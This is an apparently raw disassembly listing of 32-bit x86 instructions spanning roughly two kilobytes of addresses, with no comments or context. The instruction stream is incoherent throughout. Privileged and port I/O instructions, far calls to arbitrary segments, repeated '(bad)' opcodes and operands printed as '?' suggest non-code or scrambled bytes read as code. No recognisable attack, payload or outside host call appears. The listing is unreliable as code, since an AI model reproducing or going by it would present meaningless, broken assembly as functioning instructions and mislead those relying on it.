  40bb88:	mov    dh,0xa0
  40bb8a:	push   0x1f
  40bb8c:	cmp    eax,0x1192a442
  40bb91:	add    DWORD PTR ds:0xb85bf77b,ecx
  40bb97:	or     DWORD PTR [ecx-0x3b],ecx
  40bb9a:	or     eax,0x7517ef86
  40bb9f:	imul   ebp,DWORD PTR ss:[edx+0x20a668],0xffffff9b
  40bba7:	xchg   ecx,eax
  40bba8:	hlt    
  40bba9:	and    dl,BYTE PTR [ecx-0x1b]
  40bbac:	fadd   st(7),st
  40bbae:	mov    ah,0x95
  40bbb0:	iret   
  40bbb1:	sub    bh,cl
  40bbb3:	cmp    DWORD PTR [esi-0x7f],ebp
  40bbb6:	cmp    dh,BYTE PTR [eax+0x5038d8f9]
  40bbbc:	iret   
  40bbbd:	pop    ds
  40bbbe:	lods   al,BYTE PTR ds:[esi]
  40bbbf:	pop    si
  40bbc1:	inc    edx
  40bbc2:	stos   DWORD PTR es:[edi],eax
  40bbc3:	jp     0x40bc05
  40bbc5:	push   ebp
  40bbc6:	sub    DWORD PTR [eax],edi
  40bbc8:	cwde   
  40bbc9:	push   ss
  40bbca:	xchg   edx,eax
  40bbcb:	cmp    ebx,esi
  40bbcd:	add    ch,ch
  40bbcf:	inc    ebp
  40bbd0:	cmp    al,0xdb
  40bbd2:	pop    ss
  40bbd3:	jge    0x40bbdd
  40bbd5:	ss sub eax,0x5568fb12
  40bbdb:	test   BYTE PTR [ecx+eiz*2-0x4],dh
  40bbdf:	pop    ecx
  40bbe0:	call   0x4896:0xcd373728
  40bbe7:	les    edi,FWORD PTR [esi]
  40bbe9:	sbb    eax,ebp
  40bbeb:	inc    eax
  40bbec:	ret    
  40bbed:	inc    eax
  40bbee:	xor    al,bh
  40bbf0:	inc    ebx
  40bbf1:	in     eax,0xb2
  40bbf3:	mov    esp,esp
  40bbf5:	test   eax,0x6de1eca9
  40bbfa:	cwde   
  40bbfb:	(bad)  
  40bbfc:	ja     0x40bbb3
  40bbfe:	sahf   
  40bbff:	adc    bl,BYTE PTR [eax+0x6b119d39]
  40bc05:	mulps  xmm2,xmm2
  40bc08:	fimul  WORD PTR [eax-0x37f0a54c]
  40bc0e:	std    
  40bc0f:	jb     0x40bbfd
  40bc11:	popa   
  40bc12:	dec    eax
  40bc13:	call   0xb0dd:0xfd5a26df
  40bc1a:	ds cs push esp
  40bc1d:	or     al,0xcc
  40bc1f:	jns    0x40bbfd
  40bc21:	arpl   WORD PTR [edx-0x67],di
  40bc24:	out    dx,eax
  40bc25:	call   0x389a:0x8cf34abd
  40bc2c:	push   es
  40bc2d:	int    0x7a
  40bc2f:	stos   DWORD PTR es:[edi],eax
  40bc30:	ror    BYTE PTR cs:[ecx-0x57],cl
  40bc34:	imul   ecx,DWORD PTR [edi],0x3b
  40bc37:	xchg   esi,eax
  40bc38:	fisubr WORD PTR [esi+eax*8]
  40bc3b:	adc    dh,BYTE PTR [eax-0x3d]
  40bc3e:	into   
  40bc3f:	xchg   DWORD PTR [ebp-0x71],edx
  40bc42:	mov    bl,0x21
  40bc44:	sbb    ah,ah
  40bc46:	xor    eax,0xb3edad2d
  40bc4b:	outs   dx,BYTE PTR ds:[esi]
  40bc4c:	ins    DWORD PTR es:[edi],dx
  40bc4d:	mov    ebp,DWORD PTR [edx-0x1e611b71]
  40bc53:	dec    BYTE PTR [eax-0x6348aeed]
  40bc59:	retf   0xa9a2
  40bc5c:	aad    0x12
  40bc5e:	loopne 0x40bc08
  40bc60:	add    al,0x70
  40bc62:	rol    BYTE PTR [eax],1
  40bc64:	pop    esp
  40bc65:	or     BYTE PTR [ebp-0x7663df7c],ah
  40bc6b:	push   esp
  40bc6c:	xor    DWORD PTR [edx-0x2718e608],esi
  40bc72:	sahf   
  40bc73:	shl    bl,cl
  40bc75:	mov    ebx,0x33112071
  40bc7a:	and    BYTE PTR [esi],0x99
  40bc7d:	lods   al,BYTE PTR ds:[esi]
  40bc7e:	push   cs
  40bc7f:	out    0xd7,eax
  40bc81:	sub    BYTE PTR [eax],dh
  40bc83:	sbb    esp,DWORD PTR [eax]
  40bc85:	outs   dx,DWORD PTR ds:[esi]
  40bc86:	ss jb  0x40bc30
  40bc89:	jbe    0x40bcb0
  40bc8b:	xchg   esi,eax
  40bc8c:	nop
  40bc8d:	xor    al,0xa8
  40bc8f:	mov    BYTE PTR [eax+edi*1+0xf],dh
  40bc93:	sbb    bl,ch
  40bc95:	mov    edi,0xdf77adaf
  40bc9a:	push   es
  40bc9b:	scas   eax,DWORD PTR es:[edi]
  40bc9c:	mov    ebx,0xa786d18d
  40bca1:	pushf  
  40bca2:	gs aaa 
  40bca4:	pop    ebp
  40bca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca6:	lds    ecx,FWORD PTR [eax+0x28]
  40bca9:	push   ss
  40bcaa:	in     eax,dx
  40bcab:	jecxz  0x40bcf4
  40bcad:	or     ebx,0x955b2238
  40bcb3:	in     eax,dx
  40bcb4:	xchg   esi,eax
  40bcb5:	rcl    DWORD PTR [ecx-0x3dffcff4],0x8
  40bcbc:	imul   ecx,DWORD PTR [edi],0xffffffa4
  40bcbf:	mov    edi,0xecee15d9
  40bcc4:	xchg   esi,eax
  40bcc5:	xchg   esi,eax
  40bcc6:	ror    BYTE PTR [eax-0x3b8cf4c0],cl
  40bccc:	mov    dh,0x85
  40bcce:	stos   DWORD PTR es:[edi],eax
  40bccf:	pop    ss
  40bcd0:	aaa    
  40bcd1:	stos   BYTE PTR es:[edi],al
  40bcd2:	mov    esi,0x6ab4cedf
  40bcd7:	call   0x750b:0x12977f60
  40bcde:	jp     0x40bd26
  40bce0:	ret    0xdbd2
  40bce3:	(bad)  
  40bce4:	nop
  40bce5:	lods   eax,DWORD PTR ds:[esi]
  40bce6:	inc    esi
  40bce7:	inc    ebx
  40bce8:	cmp    eax,DWORD PTR [edx+0x1fbf84b1]
  40bcee:	or     dh,BYTE PTR [edx+0x31b88bce]
  40bcf4:	fcmove st,st(6)
  40bcf6:	xchg   BYTE PTR [ecx+0x6f],dh
  40bcf9:	fsub   st(7),st
  40bcfb:	lods   al,BYTE PTR ds:[esi]
  40bcfc:	enter  0x6736,0x4f
  40bd00:	jbe    0x40bca8
  40bd02:	mov    edi,0x484028a8
  40bd07:	jge    0x40bd2b
  40bd09:	iret   
  40bd0a:	test   eax,0x976a37a8
  40bd0f:	imul   esi,DWORD PTR [edi+0x6a],0x49
  40bd13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd14:	loop   0x40bd6d
  40bd16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd17:	sub    al,0x62
  40bd19:	push   0xb7672a85
  40bd1e:	jnp    0x40bd82
  40bd20:	sbb    DWORD PTR [esi+0x4d32d325],0x7c
  40bd27:	in     eax,0x15
  40bd29:	and    DWORD PTR [edi],esp
  40bd2b:	ror    esp,0x70
  40bd2e:	dec    edx
  40bd30:	and    DWORD PTR cs:[esi],ebp
  40bd33:	xchg   edi,eax
  40bd34:	pop    ss
  40bd35:	retf   0x96fb
  40bd38:	mov    BYTE PTR [edx+0x64567666],bh
  40bd3e:	jp     0x40bcff
  40bd40:	lahf   
  40bd41:	add    dh,cl
  40bd43:	ins    DWORD PTR es:[edi],dx
  40bd44:	adc    ecx,DWORD PTR [esi+0x36]
  40bd47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd48:	lods   al,BYTE PTR ds:[esi]
  40bd49:	cmp    BYTE PTR [eax+0x3fac2d02],bh
  40bd4f:	cmp    eax,0xa9eb5e6f
  40bd54:	stos   BYTE PTR es:[edi],al
  40bd55:	rol    DWORD PTR [ebx-0x3be23f16],0x5
  40bd5c:	daa    
  40bd5d:	sti    
  40bd5e:	mov    DWORD PTR [edi],esi
  40bd60:	fld    QWORD PTR [ebx+0xbb45865]
  40bd66:	push   cs
  40bd67:	cwde   
  40bd68:	inc    eax
  40bd69:	mov    esp,0x689869d5
  40bd6e:	inc    ebp
  40bd6f:	outs   dx,BYTE PTR ds:[esi]
  40bd70:	dec    edx
  40bd71:	xor    DWORD PTR [esi],esp
  40bd73:	xor    DWORD PTR [ebx-0x1f],edx
  40bd76:	addr16 gs or al,0xbb
  40bd7a:	xor    edx,esi
  40bd7c:	push   0xffffff98
  40bd7e:	mov    esi,0xd5b12419
  40bd83:	fcomi  st,st(4)
  40bd85:	xlat   BYTE PTR ds:[ebx]
  40bd86:	punpckldq mm5,DWORD PTR [ecx+0x61]
  40bd8a:	(bad)
  40bd8e:	mov    cs,edi
  40bd90:	outs   dx,DWORD PTR ds:[esi]
  40bd91:	adc    DWORD PTR [eax],ebx
  40bd93:	in     al,0x40
  40bd95:	jmp    0x40bdc1
  40bd97:	lods   eax,DWORD PTR ds:[esi]
  40bd98:	fwait
  40bd99:	sub    eax,0xd5106b3d
  40bd9e:	test   al,0xab
  40bda0:	sbb    eax,0x7fd25c99
  40bda5:	fsubr  st(0),st
  40bda7:	pop    esi
  40bda8:	xor    dl,BYTE PTR [ecx+0x37]
  40bdab:	(bad)  
  40bdac:	ds inc ecx
  40bdae:	mov    eax,ds:0x10824cf1
  40bdb3:	inc    esi
  40bdb4:	jle    0x40be35
  40bdb6:	dec    esi
  40bdb7:	es jmp 0x866f:0x3f7076a2
  40bdbf:	inc    esp
  40bdc0:	pop    ds
  40bdc1:	shl    BYTE PTR [ebx],0x3c
  40bdc4:	pop    es
  40bdc5:	jns    0x40bdaf
  40bdc7:	iret   
  40bdc8:	mov    BYTE PTR [edi],bl
  40bdca:	push   cs
  40bdcb:	sub    esp,ecx
  40bdcd:	(bad)  
  40bdce:	dec    edx
  40bdcf:	inc    ebx
  40bdd0:	test   BYTE PTR [eax],dh
  40bdd2:	or     eax,0xfa5f7899
  40bdd7:	mov    esi,0xc5f27fc4
  40bddc:	pusha  
  40bddd:	xchg   ebp,eax
  40bdde:	xchg   DWORD PTR [edx+0x69],ebx
  40bde1:	jbe    0x40be31
  40bde3:	xor    DWORD PTR [esi+0xb],0x1f
  40bde7:	outs   dx,DWORD PTR ds:[esi]
  40bde8:	pop    edx
  40bde9:	mov    dl,0x2f
  40bdeb:	int    0xb7
  40bded:	loopne 0x40bd7d
  40bdef:	jbe    0x40be35
  40bdf1:	xor    ebx,esp
  40bdf3:	jmp    0x7d233e4d
  40bdf8:	ja     0x40bda1
  40bdfa:	sub    esi,0xfffffff3
  40bdfd:	pop    ss
  40bdfe:	xor    esi,DWORD PTR [ecx-0x548b93f]
  40be04:	je     0x40bd9f
  40be06:	call   0x5cc527ab
  40be0b:	dec    edx
  40be0c:	retf   0xfa67
  40be0f:	push   ss
  40be10:	scas   eax,DWORD PTR es:[edi]
  40be11:	push   0x3c
  40be13:	out    dx,al
  40be14:	xlat   BYTE PTR ds:[ebx]
  40be15:	sbb    BYTE PTR [edx],ah
  40be17:	dec    ebx
  40be18:	mov    edx,0xcea67c6c
  40be1d:	mov    ecx,0x72b3a258
  40be22:	add    dh,BYTE PTR [ebx+0x47]
  40be25:	addr16 and eax,0x22f1040d
  40be2b:	out    0xbb,al
  40be2d:	imul   DWORD PTR [ecx-0x78]
  40be30:	mov    edi,DWORD PTR [edi]
  40be32:	push   esp
  40be33:	mov    edi,0x8f785695
  40be38:	xchg   ecx,eax
  40be39:	mov    bh,0xfe
  40be3b:	sbb    DWORD PTR [eax-0x25],ebx
  40be3e:	mov    eax,ds:0x56af4e78
  40be43:	daa    
  40be44:	xchg   BYTE PTR [ecx],bl
  40be46:	lods   al,BYTE PTR ds:[esi]
  40be47:	clc    
  40be48:	stos   DWORD PTR es:[edi],eax
  40be49:	mov    eax,ds:0xa854d61a
  40be4e:	pop    ds
  40be4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be50:	inc    edx
  40be51:	stos   DWORD PTR es:[edi],eax
  40be52:	in     eax,0x9e
  40be54:	ins    DWORD PTR es:[edi],dx
  40be55:	push   esi
  40be56:	cmp    eax,0xfe9f8f9
  40be5b:	fldcw  WORD PTR ds:0x98b0fef8
  40be61:	ins    BYTE PTR es:[edi],dx
  40be62:	ss pop esi
  40be64:	pop    es
  40be65:	jmp    0x40beba
  40be67:	dec    eax
  40be68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be69:	jno    0x40be26
  40be6b:	fbld   TBYTE PTR [eax]
  40be6d:	gs out 0xc6,al
  40be70:	sub    DWORD PTR [ebp-0x6bc42d9e],edi
  40be76:	out    dx,al
  40be77:	push   esp
  40be78:	lock mov WORD PTR [ebx+0x4d],?
  40be7c:	xchg   ecx,eax
  40be7d:	not    DWORD PTR ds:[edx-0x51351fa0]
  40be84:	jb     0x40be31
  40be86:	xchg   edi,eax
  40be87:	call   0xc065fdc9
  40be8c:	adc    esi,edx
  40be8e:	mov    dh,0x8
  40be90:	sub    al,ah
  40be92:	dec    edx
  40be93:	add    eax,0xd5772a2f
  40be98:	mov    fs,WORD PTR [esi+ecx*4+0x64]
  40be9c:	mov    WORD PTR [eax],gs
  40be9e:	in     al,dx
  40be9f:	scas   eax,DWORD PTR es:[edi]
  40bea0:	leave  
  40bea1:	sub    eax,DWORD PTR [ecx+0x1f]
  40bea4:	in     eax,0x22
  40bea6:	inc    esp
  40bea7:	iret   
  40bea8:	mov    edx,0xe5260bc2
  40bead:	mov    esi,0x6a96ff9a
  40beb2:	jp     0x40bf24
  40beb4:	or     eax,0xc5c57836
  40beb9:	pop    edi
  40beba:	shr    DWORD PTR [edi+0x39],1
  40bebd:	or     ebx,edi
  40bebf:	in     eax,0x15
  40bec1:	and    eax,edx
  40bec3:	mov    esi,0xdf886070
  40bec8:	jo     0x40be84
  40beca:	(bad)  
  40becb:	data16 xor al,0x40
  40bece:	(bad)  
  40becf:	adc    BYTE PTR [ebp-0x3f],cl
  40bed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bed3:	mul    DWORD PTR [ecx-0x44fc2025]
  40bed9:	lahf   
  40beda:	call   0xa408b644
  40bedf:	lock addr16 pushf 
  40bee2:	jmp    0x40bedf
  40bee4:	mov    gs,ebx
  40bee6:	push   ebx
  40bee7:	fs inc esp
  40bee9:	adc    al,0x29
  40beeb:	cli    
  40beec:	ficom  WORD PTR [ebp-0x3417a66e]
  40bef2:	lods   al,BYTE PTR ds:[esi]
  40bef3:	call   0x2096:0x162771b
  40befa:	test   BYTE PTR [eax+0x71],ch
  40befd:	xor    ecx,DWORD PTR [ebx+esi*4]
  40bf00:	pop    es
  40bf01:	in     eax,dx
  40bf02:	test   BYTE PTR [edx+0x20a9bd54],cl
  40bf08:	and    dl,bl
  40bf0a:	adc    al,bh
  40bf0c:	enter  0xefc3,0x55
  40bf10:	or     BYTE PTR [ebx+eax*8+0x7412de4f],bh
  40bf17:	sub    ebx,DWORD PTR [bp+si-0x5da]
  40bf1c:	jne    0x40bef6
  40bf1e:	mov    ch,BYTE PTR [ebx-0x1f]
  40bf21:	jns    0x40bf05
  40bf23:	add    ebx,DWORD PTR [ebp-0x2e]
  40bf26:	and    al,0x9d
  40bf28:	hlt    
  40bf29:	mov    ah,0x52
  40bf2b:	ins    BYTE PTR es:[edi],dx
  40bf2c:	mov    esi,0xfe83159a
  40bf31:	adc    bh,dl
  40bf33:	add    ah,BYTE PTR [eax-0x68f4e619]
  40bf39:	aam    0xa3
  40bf3b:	xor    eax,0xc75d82f7
  40bf40:	and    eax,0x398ede0a
  40bf45:	icebp  
  40bf46:	pusha  
  40bf47:	inc    eax
  40bf48:	inc    esi
  40bf49:	mov    ds:0xdb74d700,eax
  40bf4e:	call   0x3e5d0d3
  40bf53:	iret   
  40bf54:	test   BYTE PTR [eax+eax*2-0x650b649c],ch
  40bf5b:	outs   dx,DWORD PTR ds:[esi]
  40bf5c:	ret    0xd707
  40bf5f:	cld    
  40bf60:	push   esp
  40bf61:	test   ebx,esp
  40bf63:	ss jl  0x40bfc4
  40bf66:	add    ah,bl
  40bf68:	imul   esp,DWORD PTR [esi],0x9f2d0a02
  40bf6e:	out    dx,eax
  40bf6f:	aam    0xa9
  40bf71:	lods   eax,DWORD PTR ds:[esi]
  40bf72:	sub    ebx,DWORD PTR ds:0x79f62470
  40bf78:	call   0x8317:0xd9b2bcc5
  40bf7f:	stc    
  40bf80:	add    al,0x72
  40bf82:	pop    ebp
  40bf83:	iret   
  40bf84:	bound  esp,QWORD PTR [esp+eiz*4+0x1c9e37eb]
  40bf8b:	xor    ebx,DWORD PTR [edi]
  40bf8d:	push   edi
  40bf8e:	inc    edx
  40bf8f:	jge    0x40bfd5
  40bf91:	jbe    0x40bf46
  40bf93:	jp     0x40bff8
  40bf95:	xor    BYTE PTR [ebp+0x19],cl
  40bf98:	xchg   edi,eax
  40bf99:	mov    edi,0x448c73ba
  40bf9e:	mov    ebx,0x540f71e3
  40bfa3:	mov    bh,0xc7
  40bfa5:	adc    DWORD PTR [eax],eax
  40bfa7:	(bad)  
  40bfa8:	xor    BYTE PTR [eax-0x48],cl
  40bfab:	cmp    dh,BYTE PTR [eax+0x2c2516eb]
  40bfb1:	cmp    DWORD PTR [ecx],edx
  40bfb3:	outs   dx,DWORD PTR ds:[esi]
  40bfb4:	mov    al,ds:0xcc095e06
  40bfb9:	aaa    
  40bfba:	call   0xc353:0xff0cf6ce
  40bfc1:	fidiv  DWORD PTR [ebx]
  40bfc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfc4:	and    BYTE PTR [ebx-0x4c],al
  40bfc7:	mov    eax,ds:0x864990c
  40bfcc:	cmp    esi,ecx
  40bfce:	sbb    ebx,ebp
  40bfd0:	mov    ah,0xf8
  40bfd2:	pop    esi
  40bfd3:	cmp    eax,0x276fdb17
  40bfd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfd9:	out    dx,eax
  40bfda:	sub    eax,DWORD PTR [edi]
  40bfdc:	je     0x40bf73
  40bfde:	jecxz  0x40bfcc
  40bfe0:	ja     0x40bff0
  40bfe2:	mov    ecx,DWORD PTR ds:0xeefdbddd
  40bfe8:	lahf   
  40bfe9:	mov    WORD PTR [ebp+0x11df8309],?
  40bfef:	daa    
  40bff0:	jg     0x40bfd2
  40bff2:	adc    ecx,DWORD PTR [edi+edi*4]
  40bff5:	xchg   bh,dl
  40bff7:	xor    ch,BYTE PTR [ebx]
  40bff9:	clc    
  40bffa:	jge    0x40c04f
  40bffc:	inc    edx
  40bffd:	iret   
  40bffe:	sbb    al,BYTE PTR [ecx+0xc]
  40c001:	mov    dl,0xa3
  40c003:	test   BYTE PTR [edx-0x92dd783],ah
  40c009:	push   ebx
  40c00a:	mov    ds:0x4c16353d,eax
  40c00f:	pop    ebp
  40c010:	fdivp  st(3),st
  40c012:	scas   al,BYTE PTR es:[edi]
  40c013:	into   
  40c014:	out    dx,al
  40c015:	mov    al,0x6d
  40c017:	adc    al,0x2f
  40c019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c01a:	push   eax
  40c01b:	pop    ebp
  40c01c:	sbb    eax,0x58af10f3
  40c021:	and    eax,esp
  40c023:	mov    ch,0xb3
  40c025:	ds jb  0x40c047
  40c028:	jns    0x40c082
  40c02a:	leave  
  40c02b:	mov    ds:0x1942d6b1,al
  40c030:	shr    DWORD PTR [edx],cl
  40c032:	push   0x75
  40c034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c035:	les    edi,FWORD PTR [esi]
  40c037:	pop    ebx
  40c038:	dec    edx
  40c039:	test   BYTE PTR [ebp-0x4a],bl
  40c03c:	push   0xffffff93
  40c03e:	jae    0x40c086
  40c040:	push   ecx
  40c041:	sbb    DWORD PTR [ebx-0x33],esi
  40c044:	cdq    
  40c045:	push   es
  40c046:	xchg   ebx,eax
  40c047:	push   DWORD PTR [esi-0x73]
  40c04a:	sbb    edx,DWORD PTR [ecx-0x1b540208]
  40c050:	mov    al,ds:0xce972bb4
  40c055:	inc    esi
  40c056:	mov    al,BYTE PTR ds:0x924eedd7
  40c05c:	sbb    BYTE PTR [ecx],bl
  40c05e:	cmp    ah,BYTE PTR [esp+edx*1+0x27]
  40c062:	cs cwde 
  40c064:	cs inc ecx
  40c066:	push   0xffffff9a
  40c068:	mov    al,0xf8
  40c06a:	and    BYTE PTR [eax],ah
  40c06c:	dec    DWORD PTR [edx+eax*8-0x129d9340]
  40c073:	fdivr  QWORD PTR [esi]
  40c075:	and    DWORD PTR [ebx+edi*4+0x6cacec7],0xd00078fd
  40c080:	and    esi,esi
  40c082:	enter  0xfdfb,0x3c
  40c086:	sub    eax,0x46f3a611
  40c08b:	mov    WORD PTR [eax+0x4dfb0e45],es
  40c091:	test   eax,0x4799fde4
  40c096:	push   esi
  40c097:	inc    ebx
  40c099:	cmp    DWORD PTR [edx-0x5ca1e9df],ebx
  40c09f:	imul   BYTE PTR [edi+0x3]
  40c0a2:	enter  0x6311,0xe7
  40c0a6:	or     ah,cl
  40c0a8:	popa   
  40c0a9:	inc    ecx
  40c0aa:	jae    0x40c0b1
  40c0ac:	pop    es
  40c0ad:	cmp    ecx,DWORD PTR [ebp+0x72]
  40c0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0b1:	fwait
  40c0b2:	push   edi
  40c0b3:	xchg   edi,eax
  40c0b4:	cli    
  40c0b5:	sub    al,0x3a
  40c0b7:	add    ecx,edx
  40c0b9:	sub    edi,DWORD PTR [ebx]
  40c0bb:	mov    cl,0xcd
  40c0bd:	push   ebx
  40c0be:	add    bh,BYTE PTR [eax]
  40c0c0:	push   ebp
  40c0c1:	add    BYTE PTR [ebp+0x2],bh
  40c0c4:	and    DWORD PTR [ebp+0x5d],esi
  40c0c7:	cs leave 
  40c0c9:	dec    al
  40c0cb:	test   BYTE PTR [eax+0x116d89e6],ah
  40c0d1:	adc    DWORD PTR [ebx+eax*2-0x54],eax
  40c0d5:	mov    BYTE PTR [ebx+eax*2-0x3ba9630e],bh
  40c0dc:	sub    al,0x29
  40c0de:	lds    edx,FWORD PTR [ebx+0x61]
  40c0e1:	jne    0x40c077
  40c0e3:	pop    esp
  40c0e4:	cmp    esp,DWORD PTR [esi+0x7e]
  40c0e7:	sbb    eax,0x7f08858f
  40c0ec:	xchg   ebx,eax
  40c0ed:	fnstenv [ebp+0x6c]
  40c0f0:	loop   0x40c0b0
  40c0f2:	rep lods al,BYTE PTR ds:[esi]
  40c0f4:	jecxz  0x40c094
  40c0f6:	repnz mov al,0xa5
  40c0f9:	lods   eax,DWORD PTR ds:[esi]
  40c0fa:	data16 mov bl,0xc3
  40c0fd:	inc    esp
  40c0fe:	sbb    DWORD PTR [edx+0x20ae515b],edx
  40c104:	dec    edi
  40c105:	mov    DWORD PTR [edx-0x5e2fdff4],ebx
  40c10b:	aam    0x37
  40c10d:	jg     0x40c172
  40c10f:	mov    ecx,0x16f54675
  40c114:	(bad)  
  40c115:	shl    BYTE PTR [esi+0x114176c],cl
  40c11b:	data16 jb 0x40c115
  40c11e:	in     eax,0x98
  40c120:	push   edi
  40c121:	popf   
  40c122:	arpl   bx,ax
  40c124:	dec    esi
  40c125:	cmp    BYTE PTR [eax+ebp*1+0x72],ch
  40c129:	sbb    ecx,DWORD PTR fs:[ecx-0x8]
  40c12d:	sbb    DWORD PTR [ebp+0x7114bf1b],0xefb4792c
  40c137:	out    0x6,eax
  40c139:	sti    
  40c13a:	fmul   QWORD PTR [esi-0x1d]
  40c13d:	(bad)  
  40c13e:	outs   dx,DWORD PTR ds:[esi]
  40c13f:	jmp    eax
  40c141:	cli    
  40c142:	add    DWORD PTR [ecx+0x62],0x50068af6
  40c149:	lds    esi,FWORD PTR [edi+ebp*2+0x6e991ef1]
  40c150:	popf   
  40c151:	call   0xcd2a:0x345382f9
  40c158:	in     eax,dx
  40c159:	add    BYTE PTR [ebp+0x768a37e8],dh
  40c15f:	push   ebp
  40c160:	lods   al,BYTE PTR ds:[esi]
  40c161:	jmp    0xa990:0x8225108
  40c168:	stc    
  40c169:	dec    ebp
  40c16a:	mov    edi,es
  40c16c:	mov    dh,0x86
  40c16e:	icebp  
  40c16f:	(bad)  
  40c171:	adc    eax,0x9fefe67d
  40c176:	pop    ds
  40c177:	and    eax,0xec8af7fb
  40c17c:	push   esp
  40c17d:	cdq    
  40c17e:	mov    al,ds:0x915ebb2
  40c183:	xor    ecx,DWORD PTR [esi+eax*1]
  40c186:	dec    eax
  40c187:	sahf   
  40c188:	rol    BYTE PTR ds:0x3c8e112e,cl
  40c18e:	test   BYTE PTR [ebp-0x5e],ah
  40c191:	cli    
  40c192:	je     0x40c171
  40c194:	inc    esp
  40c195:	mov    ds:0x4baa1491,eax
  40c19a:	or     eax,0x2bfe56bc
  40c19f:	cmp    DWORD PTR [ebx+0x122ab8b1],ebp
  40c1a5:	jmp    0x40c155
  40c1a7:	cld    
  40c1a8:	(bad)  
  40c1a9:	fsubp  st(7),st
  40c1ab:	add    al,0xe2
  40c1ad:	add    DWORD PTR [edi+0x612b2d02],0xffffffe4
  40c1b4:	adc    DWORD PTR [edx+0x3f3a73a7],esi
  40c1ba:	sbb    esp,DWORD PTR [edx-0x915a0d5]
  40c1c0:	sub    ebx,eax
  40c1c2:	sahf   
  40c1c3:	and    BYTE PTR [ebp+0x1b],al
  40c1c6:	sbb    edi,eax
  40c1c8:	or     ebp,DWORD PTR [edi+0x64]
  40c1cb:	and    BYTE PTR [si],0xd3
  40c1cf:	shr    BYTE PTR es:[edx],1
  40c1d2:	scas   al,BYTE PTR es:[edi]
  40c1d3:	mov    eax,ds:0xed9d2d95
  40c1d8:	lahf   
  40c1d9:	sub    al,0x9a
  40c1db:	or     ah,BYTE PTR [edi]
  40c1dd:	ja     0x40c244
  40c1df:	fiadd  DWORD PTR [ebx+ebx*2+0x57b6a4e3]
  40c1e6:	(bad)  
  40c1e7:	fstp   QWORD PTR [ebp+0x62]
  40c1ea:	push   ebx
  40c1eb:	lds    eax,FWORD PTR [ebx+0x574640fd]
  40c1f1:	pop    ds
  40c1f2:	dec    eax
  40c1f3:	lahf   
  40c1f4:	push   cs
  40c1f5:	mov    edx,0x7e5cf162
  40c1fa:	or     eax,DWORD PTR fs:[ebp+0x38]
  40c1fe:	add    ah,BYTE PTR [ecx]
  40c200:	cld    
  40c201:	daa    
  40c202:	push   edx
  40c203:	popa   
  40c204:	sub    dl,al
  40c206:	mov    edi,0x32b05d5c
  40c20b:	sahf   
  40c20c:	(bad)  [esp+ebx*8+0x519addb6]
  40c213:	mov    esi,0x416170aa
  40c218:	lahf   
  40c219:	adc    ah,0x1f
  40c21c:	inc    edx
  40c21d:	sbb    BYTE PTR [edi+0x27],ch
  40c220:	dec    edi
  40c221:	int3   
  40c222:	and    al,0xc8
  40c224:	dec    ebx
  40c225:	jne    0x40c272
  40c227:	jg     0x40c27d
  40c229:	sub    ebp,edx
  40c22b:	adc    bl,ch
  40c22d:	push   cs
  40c22e:	push   edi
  40c22f:	pop    esp
  40c230:	nop
  40c231:	mov    bh,0x27
  40c233:	mov    ebp,0xa9ae7292
  40c238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c239:	das    
  40c23a:	mov    ds:0x345b16a8,eax
  40c23f:	int    0x9e
  40c241:	(bad)  [ebp-0x9f99902]
  40c247:	call   0x26a6:0x117e93cc
  40c24e:	sub    eax,0x7997339f
  40c253:	test   eax,0x7eb067fc
  40c258:	mov    dh,0x18
  40c25a:	adc    DWORD PTR [ebx-0x17c48ebb],edi
  40c260:	jb     0x40c285
  40c262:	sbb    BYTE PTR [esi-0x2d],ah
  40c265:	jmp    0x40c29d
  40c267:	cs sti 
  40c269:	and    BYTE PTR [ebx+0x50],dl
  40c26c:	sar    edi,0xb2
  40c26f:	push   edi
  40c270:	jge    0x40c21d
  40c272:	neg    BYTE PTR [ebx+esi*2+0x53]
  40c276:	stos   BYTE PTR es:[edi],al
  40c277:	xor    DWORD PTR [eax-0x5491c3e7],ebp
  40c27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c27e:	popf   
  40c27f:	je     0x40c252
  40c281:	ret    0x53c4
  40c284:	inc    esi
  40c285:	pop    esi
  40c286:	add    ch,BYTE PTR ds:0xef4aca0c
  40c28c:	mov    cl,0xe
  40c28e:	xchg   ebx,eax
  40c28f:	xor    DWORD PTR [esi-0x2844ae24],ebx
  40c295:	push   eax
  40c296:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c298:	call   0xa48:0x592deaa3
  40c29f:	mov    dh,0xe9
  40c2a1:	lock das 
  40c2a3:	jg     0x40c26f
  40c2a5:	add    al,BYTE PTR [ebp+edi*1-0x74609713]
  40c2ac:	mov    al,0x27
  40c2ae:	adc    ebx,eax
  40c2b0:	lea    eax,[edx-0x5f]
  40c2b3:	call   0x4bd431a6
  40c2b8:	mov    ebx,esi
  40c2ba:	and    bh,bl
  40c2bc:	scas   al,BYTE PTR es:[edi]
  40c2bd:	jbe    0x40c2b6
  40c2bf:	or     eax,0xd8da46f8
  40c2c4:	pushf  
  40c2c5:	mov    al,0xa6
  40c2c7:	cmp    bl,al
  40c2c9:	pxor   mm6,QWORD PTR [esi-0x4c]
  40c2cd:	lock aas 
  40c2cf:	out    dx,al
  40c2d0:	pop    ebp
  40c2d1:	dec    esp
  40c2d2:	mov    ah,0x5e
  40c2d4:	inc    esp
  40c2d5:	inc    esp
  40c2d6:	arpl   WORD PTR [edx-0x28aae1f8],si
  40c2dc:	sbb    eax,0x841801a1
  40c2e1:	scas   al,BYTE PTR es:[edi]
  40c2e2:	mov    ds:0xefba6b30,eax
  40c2e7:	mov    ?,WORD PTR [esp+esi*8+0x59]
  40c2eb:	adc    ecx,DWORD PTR [ebx+0x2]
